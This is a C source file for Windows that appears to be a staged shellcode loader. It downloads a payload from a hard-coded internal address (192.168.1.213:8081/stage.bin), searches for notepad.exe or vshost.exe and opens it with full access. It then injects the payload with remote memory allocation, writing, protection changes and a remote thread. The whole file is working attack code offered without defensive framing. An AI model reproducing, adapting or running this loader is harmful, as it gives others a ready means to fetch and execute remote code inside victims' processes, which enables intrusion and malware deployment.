#include <stdio.h>
#include <Windows.h>
#include <wininet.h>
#include <TlHelp32.h>
#define PAYLOAD_URL L"http://192.168.1.213:8081/stage.bin"

#pragma comment (lib, "Wininet.lib")

BOOL FetchFileFromUrl(IN LPCWSTR szFileDownloadUrl, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize)
{
	*pdwFileSize = 0;
	*ppFileBuffer = NULL;

	HINTERNET hInternet = NULL,
		hInternetFile = NULL;
	DWORD dwTmpBytesRead = 0x00,
		dwFileSize = 0x00;
	PBYTE pFileBuffer = NULL,
		pTmpPtr = NULL;

	if (!ppFileBuffer || !pdwFileSize)
		return FALSE;

	if (!(hInternet = InternetOpenW(NULL, 0x00, NULL, NULL, 0x00))) {
		printf("[!] InternetOpenW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(hInternetFile = InternetOpenUrlW(hInternet, szFileDownloadUrl, NULL, 0x00, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0x00))) {
		printf("[!] InternetOpenUrlW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pTmpPtr = LocalAlloc(LPTR, 1024))) {
		printf("[!] LocalAlloc Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	while (TRUE) {
		if (!InternetReadFile(hInternetFile, pTmpPtr, 1024, &dwTmpBytesRead)) {
			printf("[!] InternetReadFile Failed With Error: %d\n ", GetLastError());
			goto _END_OF_FUNC;
		}

		dwFileSize += dwTmpBytesRead;

		if (!pFileBuffer)
			pFileBuffer = LocalAlloc(LPTR, dwTmpBytesRead);
		else
			pFileBuffer = LocalReAlloc(pFileBuffer, dwFileSize, LMEM_MOVEABLE | LMEM_ZEROINIT); // Reallocate size to the total size of dwFileSize

		if (!pFileBuffer)
		{
			printf("[!] LocalAlloc/LocalReAlloc [%d] Failed With Error: %ld\n", __LINE__, GetLastError());
			goto _END_OF_FUNC;
		}

		memcpy(pFileBuffer + (dwFileSize - dwTmpBytesRead), pTmpPtr, dwTmpBytesRead); // Append temp buffer onto the end of real buffer

		memset(pTmpPtr, 0x00, dwTmpBytesRead);

		if (dwTmpBytesRead == 0) {
			break;
		}
	}

	*ppFileBuffer = pFileBuffer;
	*pdwFileSize = dwFileSize;
_END_OF_FUNC:
	if (pTmpPtr)
		LocalFree(pTmpPtr);
		if ((!*ppFileBuffer || !*pdwFileSize) && pFileBuffer)

			LocalFree(pFileBuffer);
			if (hInternetFile)
				InternetCloseHandle(hInternetFile);
			if (hInternet)
				InternetCloseHandle(hInternet);
			if (hInternet)
				InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

	return (*ppFileBuffer != NULL && *pdwFileSize != 0x00) ? TRUE : FALSE;
}

DWORD GetProcList(HANDLE* hProcess,DWORD* dwProcessId)
{
	const WCHAR* aszProcList[2] = {
	L"notepad.exe",
	L"vshost.exe"
	};

	DWORD pid = 0;
	WCHAR szProcname = NULL;
	DWORD dwSize = sizeof(aszProcList) / sizeof(aszProcList[0]);
	for (int i = 0; i < dwSize; i++)
	{
		pid = GetProcName(aszProcList[i], hProcess, dwProcessId);
		if (pid > 0) {
			printf("[i] Pid found at: %lu\n", (unsigned long)*dwProcessId);
			return pid;
		}
		else if (pid == -1)
		{
			printf("[!] Process Was Found, But Could Not Be Opened.\n");
		}
		else {
			printf("[!] Pid not found!\n");
		}
	}
	return 0;
}

DWORD GetProcName(const WCHAR* szProcName, HANDLE* hProcess, DWORD* dwProcessId) {
	
	PROCESSENTRY32 Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};
	
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	HANDLE hOpenedProc = NULL;
	DWORD pid = 0;

	if (INVALID_HANDLE_VALUE == hSnapshot)
	{
		printf("[!] Error With CreateToolhelp32Snapshot: %d", GetLastError());
		return -1;
	}

	if (!Process32First(hSnapshot, &Proc)) {
		printf("[!] Process32First failed %lu\n", GetLastError());
		CloseHandle(hSnapshot);
		return -1;
	}

	do {
		if (lstrcmpiW(szProcName, Proc.szExeFile) == 0) {
			pid = Proc.th32ProcessID;
			*dwProcessId = pid;
			hOpenedProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			break;
		}
	} while (Process32Next(hSnapshot, &Proc));

	if (hOpenedProc == NULL)
	{
		printf("[!] OpenProcess Failed For PID %lu with error: %lu\n", Proc.th32ProcessID, GetLastError());
		return -1;
	}
	
	*hProcess = hOpenedProc;

	printf("[+] OpenProcess Succeeded: %p\n", *hProcess);
	CloseHandle(hSnapshot);
	return pid;
}

BOOL InjectToProcess(PBYTE pShellcode, SIZE_T sSizeOfShellcode, HANDLE hProcess)
{
	PVOID pShellcodeAddress = NULL;
	SIZE_T sNumberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;

	printf("[i] hProcess (INTERNAL) = %p\n", hProcess);

	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL)
	{
		printf("[!] VirtualAllocEx Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	printf("[i] Allocated Memory At: 0x%p\n", pShellcodeAddress);

	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode)
	{
		printf("[!] WriteProcessMemory Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	memset(pShellcode, '\0', sNumberOfBytesWritten);

	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection))
	{
		printf("[!] VirtualProtectEx Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL)
	{
		printf("[!] CreateRemoteThread Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	printf("[+] Done\n");

	return TRUE;
}

int main()
{
	PBYTE pPayloadFileBuffer = NULL;
	DWORD dwPayloadFileSize = 0x00;
	HANDLE hProcess = NULL;
	DWORD dwProcessId = NULL;
	
	if (!FetchFileFromUrl(PAYLOAD_URL, &pPayloadFileBuffer, &dwPayloadFileSize))
	{
		return -1;
	}

	printf("[*] Fetched Payload [0x%p] of %ld Bytes\n", pPayloadFileBuffer, dwPayloadFileSize);
	getchar();

	if (!GetProcList(&hProcess, &dwProcessId))
	{
		printf("[!] Issue With GetProcList");
		return -1;
	}


	printf("[i] Process EXTERNAL Handle: %p\n", hProcess);
	if (!InjectToProcess(pPayloadFileBuffer, dwPayloadFileSize, hProcess))
	{
		return -1;
	}

	LocalFree(pPayloadFileBuffer);
	CloseHandle(hProcess);
	printf("[#] Press <Enter> To Quit...");
	getchar();

	return 0;
}